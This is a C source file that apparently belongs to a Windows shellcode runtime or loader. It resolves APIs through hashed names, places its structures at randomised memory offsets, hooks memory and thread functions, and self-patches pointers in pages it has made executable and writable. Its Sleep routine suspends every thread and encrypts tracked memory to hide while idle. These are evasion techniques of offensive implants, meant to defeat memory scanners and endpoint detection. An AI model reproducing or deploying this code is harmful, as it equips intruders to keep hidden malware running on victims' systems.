#include "go_types.h"
#include "windows_t.h"
#include "hash_api.h"
#include "context.h"
#include "random.h"
#include "crypto.h"
#include "memory.h"
#include "thread.h"
#include "runtime.h"
#include "epilogue.h"

// hard encoded address in methods for replace
#ifdef _WIN64
    #define METHOD_ADDR_SLEEP   0x7FFFFFFFFFFFFFF0
    #define METHOD_ADDR_HIDE    0x7FFFFFFFFFFFFFF1
    #define METHOD_ADDR_RECOVER 0x7FFFFFFFFFFFFFF2
    #define METHOD_ADDR_STOP    0x7FFFFFFFFFFFFFF3
#elif _WIN32
    #define METHOD_ADDR_SLEEP   0x7FFFFFF0
    #define METHOD_ADDR_HIDE    0x7FFFFFF1
    #define METHOD_ADDR_RECOVER 0x7FFFFFF2
    #define METHOD_ADDR_STOP    0x7FFFFFF3
#endif

typedef struct {
    Runtime_Args* Args;

    // store all structures
    uintptr MainMemPage;

    // API addresses
    VirtualAlloc          VirtualAlloc;
    VirtualFree           VirtualFree;
    VirtualProtect        VirtualProtect;
    FlushInstructionCache FlushInstructionCache;
    CreateMutexA          CreateMutexA;
    ReleaseMutex          ReleaseMutex;
    WaitForSingleObject   WaitForSingleObject;
    CloseHandle           CloseHandle;

    // for simulate Sleep
    HANDLE hProcess;

    // global mutex
    HANDLE Mutex;

    // sub modules
    MemoryTracker_M* MemoryTracker;
    ThreadTracker_M* ThreadTracker;
} Runtime;

// methods about Runtime
bool RT_Sleep(uint32 milliseconds);
bool RT_Hide();
bool RT_Recover();
bool RT_Stop();

static uintptr allocateRuntimeMemory(FindAPI_t findAPI);
static bool initRuntimeAPI(Runtime* runtime);
static uint initRuntimeEnvironment(Runtime* runtime);
static uint initMemoryTracker(Runtime* runtime, Context* context);
static uint initThreadTracker(Runtime* runtime, Context* context);
static bool updateRuntimePointers(Runtime* runtime);
static bool updateRuntimePointer(Runtime* runtime, void* method, uintptr address);
static bool adjustPageProtect(Runtime* runtime, uint32* old);
static bool recoverPageProtect(Runtime* runtime, uint32* old);
static void cleanRuntime(Runtime* runtime);
static bool sleep(Runtime* runtime, uint32 milliseconds);
static bool hide(Runtime* runtime);
static bool recover(Runtime* runtime);

__declspec(noinline)
Runtime_M* InitRuntime(Runtime_Args* args)
{
    uintptr address = allocateRuntimeMemory(args->FindAPI);
    if (address == NULL)
    {
        return NULL;
    }
    // set structure address
    uintptr runtimeAddr = address + 300 + RandUint(address) % 256;
    uintptr moduleAddr  = address + 900 + RandUint(address) % 256;
    // initialize structure
    Runtime* runtime = (Runtime*)runtimeAddr;
    runtime->Args = args;
    runtime->MainMemPage = address;
    // initialize runtime
    uint32 protect = 0;
    uint   errCode = 0;
    for (;;)
    {
        if (!initRuntimeAPI(runtime))
        {
            errCode = 0xF1;
            break;
        }
        if (!adjustPageProtect(runtime, &protect))
        {
            errCode = 0xF2;
            break;
        }
        errCode = initRuntimeEnvironment(runtime);
        if (errCode != 0x00)
        {
            break;
        }
        if (!updateRuntimePointers(runtime))
        {
            errCode = 0xF4;
            break;
        }
        if (!recoverPageProtect(runtime, &protect))
        {
            errCode = 0xF5;
            break;
        }
        break;
    }
    if (errCode != 0x00)
    {
        cleanRuntime(runtime);
        return (Runtime_M*)errCode;
    }
    // clean context data in structure
    uintptr ctxBegin = (uintptr)(runtime);
    uintptr ctxSize  = (uintptr)(&runtime->CreateMutexA) - ctxBegin;
    RandBuf((byte*)ctxBegin, (int64)ctxSize);
    // create methods for Runtime
    Runtime_M* module = (Runtime_M*)moduleAddr;
    // for IAT hooks
    module->VirtualAlloc    = runtime->MemoryTracker->VirtualAlloc;
    module->VirtualFree     = runtime->MemoryTracker->VirtualFree;
    module->VirtualProtect  = runtime->MemoryTracker->VirtualProtect;
    module->CreateThread    = runtime->ThreadTracker->CreateThread;
    module->ExitThread      = runtime->ThreadTracker->ExitThread;
    module->SuspendThread   = runtime->ThreadTracker->SuspendThread;
    module->ResumeThread    = runtime->ThreadTracker->ResumeThread;
    module->TerminateThread = runtime->ThreadTracker->TerminateThread;
    // for develop shellcode
    module->Alloc = runtime->MemoryTracker->MemAlloc;
    module->Free  = runtime->MemoryTracker->MemFree;
    // runtime core methods
    module->Sleep   = &RT_Sleep;
    module->Hide    = &RT_Hide;
    module->Recover = &RT_Recover;
    module->Stop    = &RT_Stop;
    return module;
}

// allocate memory for store structures.
static uintptr allocateRuntimeMemory(FindAPI_t findAPI)
{
#ifdef _WIN64
    uint hash = 0xB6A1D0D4A275D4B6;
    uint key  = 0x64CB4D66EC0BEFD9;
#elif _WIN32
    uint hash = 0xC3DE112E;
    uint key  = 0x8D9EA74F;
#endif
    VirtualAlloc virtualAlloc = (VirtualAlloc)findAPI(hash, key);
    if (virtualAlloc == NULL)
    {
        return NULL;
    }
    uintptr address = virtualAlloc(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (address == NULL)
    {
        return NULL;
    }
    RandBuf((byte*)address, 4096);
    return address;
}

static bool initRuntimeAPI(Runtime* runtime)
{
    typedef struct { 
        uint hash; uint key; uintptr address;
    } winapi;
    winapi list[] =
#ifdef _WIN64
    {
        { 0x6AC498DF641A4FCB, 0xFF3BB21B9BA46CEA }, // VirtualAlloc
        { 0xAC150252A6CA3960, 0x12EFAEA421D60C3E }, // VirtualFree
        { 0xEA5B0C76C7946815, 0x8846C203C35DE586 }, // VirtualProtect
        { 0x8172B49F66E495BA, 0x8F0D0796223B56C2 }, // FlushInstructionCache
        { 0x31FE697F93D7510C, 0x77C8F05FE04ED22D }, // CreateMutexA
        { 0xEEFDEA7C0785B561, 0xA7B72CC8CD55C1D4 }, // ReleaseMutex
        { 0xA524CD56CF8DFF7F, 0x5519595458CD47C8 }, // WaitForSingleObject
        { 0xA25F7449D6939A01, 0x85D37F1D89B30D2E }, // CloseHandle
    };
#elif _WIN32
    {
        { 0xB47741D5, 0x8034C451 }, // VirtualAlloc
        { 0xF76A2ADE, 0x4D8938BD }, // VirtualFree
        { 0xB2AC456D, 0x2A690F63 }, // VirtualProtect
        { 0x87A2CEE8, 0x42A3C1AF }, // FlushInstructionCache
        { 0x8F5BAED2, 0x43487DC7 }, // CreateMutexA
        { 0xFA42E55C, 0xEA9F1081 }, // ReleaseMutex
        { 0xC21AB03D, 0xED3AAF22 }, // WaitForSingleObject
        { 0x60E108B2, 0x3C2DFF52 }, // CloseHandle
    };
#endif
    uintptr address;
    for (int i = 0; i < arrlen(list); i++)
    {
        address = runtime->Args->FindAPI(list[i].hash, list[i].key);
        if (address == NULL)
        {
            return false;
        }
        list[i].address = address;
    }

    runtime->VirtualAlloc          = (VirtualAlloc         )(list[0].address);
    runtime->VirtualFree           = (VirtualFree          )(list[1].address);
    runtime->VirtualProtect        = (VirtualProtect       )(list[2].address);
    runtime->FlushInstructionCache = (FlushInstructionCache)(list[3].address);
    runtime->CreateMutexA          = (CreateMutexA         )(list[4].address);
    runtime->ReleaseMutex          = (ReleaseMutex         )(list[5].address);
    runtime->WaitForSingleObject   = (WaitForSingleObject  )(list[6].address);
    runtime->CloseHandle           = (CloseHandle          )(list[7].address);
    return true;
}

static uint initRuntimeEnvironment(Runtime* runtime)
{
    // initialize structure fields
    runtime->Mutex = NULL;
    runtime->MemoryTracker = NULL;
    // create global mutex
    HANDLE hMutex = runtime->CreateMutexA(NULL, false, NULL);
    if (hMutex == NULL)
    {
        return 0xF3;
    }
    runtime->Mutex = hMutex;
    // create context data for initialize other modules
    Context context = 
    {
        .FindAPI     = runtime->Args->FindAPI,
        .MainMemPage = runtime->MainMemPage,

        .VirtualAlloc          = runtime->VirtualAlloc,
        .VirtualFree           = runtime->VirtualFree,
        .VirtualProtect        = runtime->VirtualProtect,
        .FlushInstructionCache = runtime->FlushInstructionCache,
        .CreateMutexA          = runtime->CreateMutexA,
        .ReleaseMutex          = runtime->ReleaseMutex,
        .WaitForSingleObject   = runtime->WaitForSingleObject,
        .CloseHandle           = runtime->CloseHandle,

        .Mutex = runtime->Mutex,
    };
    uint errCode;
    errCode = initMemoryTracker(runtime, &context);
    if (errCode != 0x00)
    {
        return errCode;
    }
    errCode = initThreadTracker(runtime, &context);
    if (errCode != 0x00)
    {
        return errCode;
    }
    return 0x00;
}

static uint initMemoryTracker(Runtime* runtime, Context* context)
{
    MemoryTracker_M* tracker = InitMemoryTracker(context);
    if (tracker < (MemoryTracker_M*)(0x10))
    {
        return (uint)tracker;
    }
    runtime->MemoryTracker = tracker;
    return 0x00;
}

static uint initThreadTracker(Runtime* runtime, Context* context)
{
    // allocate memory page for store thread id and handles
    void* page = runtime->MemoryTracker->MemAlloc(THREADS_PAGE_SIZE);
    if (page == NULL)
    {
        return 0xF4;
    }
    context->TTMemPage = (uintptr)page;

    ThreadTracker_M* tracker = InitThreadTracker(context);
    if (tracker < (ThreadTracker_M*)(0x20))
    {
        return (uint)tracker;
    }
    runtime->ThreadTracker = tracker;
    return 0x00;
}

static bool updateRuntimePointers(Runtime* runtime)
{    
    typedef struct {
        void* address; uintptr pointer;
    } method;
    method methods[] = 
    {
        { &RT_Sleep,   METHOD_ADDR_SLEEP },
        { &RT_Hide,    METHOD_ADDR_HIDE },
        { &RT_Recover, METHOD_ADDR_RECOVER },
        { &RT_Stop,    METHOD_ADDR_STOP },
    };
    bool success = true;
    for (int i = 0; i < arrlen(methods); i++)
    {
        if (!updateRuntimePointer(runtime, methods[i].address, methods[i].pointer))
        {
            success = false;
            break;
        }
    }
    return success;
}

static bool updateRuntimePointer(Runtime* runtime, void* method, uintptr address)
{
    bool success = false;
    uintptr target = (uintptr)method;
    for (uintptr i = 0; i < 64; i++)
    {
        uintptr* pointer = (uintptr*)(target);
        if (*pointer != address)
        {
            target++;
            continue;
        }
        *pointer = (uintptr)runtime;
        success = true;
        break;
    }
    return success;
}

// change memory protect for dynamic update pointer that hard encode.
static bool adjustPageProtect(Runtime* runtime, uint32* old)
{
    if (runtime->Args->NotAdjustProtect)
    {
        return true;
    }
    uintptr begin = (uintptr)(&InitRuntime);
    uintptr end   = (uintptr)(&Epilogue);
    uint    size  = end - begin;
    return runtime->VirtualProtect(begin, size, PAGE_EXECUTE_READWRITE, old);
}

static bool recoverPageProtect(Runtime* runtime, uint32* old)
{
    uintptr begin = (uintptr)(&InitRuntime);
    uintptr end   = (uintptr)(&Epilogue);
    uint    size  = end - begin;
    if (!runtime->Args->NotAdjustProtect)
    {
        if (!runtime->VirtualProtect(begin, size, *old, old))
        {
            return false;
        }
    }
    return runtime->FlushInstructionCache(CURRENT_PROCESS, begin, size);
}

static void cleanRuntime(Runtime* runtime)
{
    CloseHandle closeHandle = runtime->CloseHandle;
    if (closeHandle != NULL && runtime->Mutex != NULL)
    {
        closeHandle(runtime->Mutex);
    }

    // TODO Protect ASM self
    // TODO Remove self

    // must copy api address before call RandBuf
    VirtualFree virtualFree = runtime->VirtualFree;
    RandBuf((byte*)runtime->MainMemPage, 4096);
    if (virtualFree != NULL)
    {
        virtualFree(runtime->MainMemPage, 0, MEM_RELEASE);
    }
}

// updateRuntimePointers will replace hard encode address to the actual address.
// Must disable compiler optimize, otherwise updateRuntimePointer will fail.
#pragma optimize("", off)
static Runtime* getRuntimePointer(uintptr pointer)
{
    return (Runtime*)(pointer);
}
#pragma optimize("", on)

__declspec(noinline)
bool RT_Sleep(uint32 milliseconds)
{
    Runtime* runtime = getRuntimePointer(METHOD_ADDR_SLEEP);

    if (runtime->WaitForSingleObject(runtime->Mutex, INFINITE) != WAIT_OBJECT_0)
    {
        return false;
    }

    bool success = true;
    for (;;)
    {
        if (!hide(runtime))
        {
            success = false;
            break;
        }
        if (!sleep(runtime, milliseconds))
        {
            success = false;
        }
        if (!recover(runtime))
        {
            success = false;
            break;
        }
        break;
    }

    runtime->ReleaseMutex(runtime->Mutex);
    return success;
}

// TODO fix bug
static bool sleep(Runtime* runtime, uint32 milliseconds)
{
    HANDLE hMutex = runtime->CreateMutexA(NULL, false, NULL);
    if (hMutex == NULL)
    {
        return false;
    }
    if (milliseconds < 100)
    {
        milliseconds = 100;
    }



    // will deadlock until timeout
    runtime->WaitForSingleObject(CURRENT_PROCESS, milliseconds);
    runtime->WaitForSingleObject(hMutex, milliseconds);
    runtime->ReleaseMutex(hMutex);
    return runtime->CloseHandle(hMutex);
}

__declspec(noinline)
bool RT_Hide()
{
    Runtime* runtime = getRuntimePointer(METHOD_ADDR_HIDE);

    if (runtime->WaitForSingleObject(runtime->Mutex, INFINITE) != WAIT_OBJECT_0)
    {
        return false;
    }
    bool success = hide(runtime);
    runtime->ReleaseMutex(runtime->Mutex);
    return success;
}

static bool hide(Runtime* runtime)
{
    bool success = true;
    for (;;)
    {
        if (!runtime->ThreadTracker->ThdSuspendAll())
        {
            success = false;
            break;
        }
        if (!runtime->MemoryTracker->MemEncrypt())
        {
            success = false;
            break;
        }
        break;
    }
    return success;
}

__declspec(noinline)
bool RT_Recover()
{
    Runtime* runtime = getRuntimePointer(METHOD_ADDR_RECOVER);

    if (runtime->WaitForSingleObject(runtime->Mutex, INFINITE) != WAIT_OBJECT_0)
    {
        return false;
    }
    bool success = recover(runtime);
    runtime->ReleaseMutex(runtime->Mutex);
    return success;
}

static bool recover(Runtime* runtime)
{
    bool success = true;
    for (;;)
    {
        if (!runtime->MemoryTracker->MemDecrypt())
        {
            success = false;
            break;
        }
        if (!runtime->ThreadTracker->ThdResumeAll())
        {
            success = false;
            break;
        }
        break;
    }
    return success;
}

__declspec(noinline)
bool RT_Stop()
{
    Runtime* runtime = getRuntimePointer(METHOD_ADDR_STOP);

    if (runtime->WaitForSingleObject(runtime->Mutex, INFINITE) != WAIT_OBJECT_0)
    {
        return false;
    }

    bool success = true;
    for (;;)
    {
        if (!runtime->ThreadTracker->ThdClean())
        {
            success = false;
            break;
        }
        if (!runtime->MemoryTracker->MemClean())
        {
            success = false;
            break;
        }
        break;
    }

    runtime->ReleaseMutex(runtime->Mutex);
    return success;
}
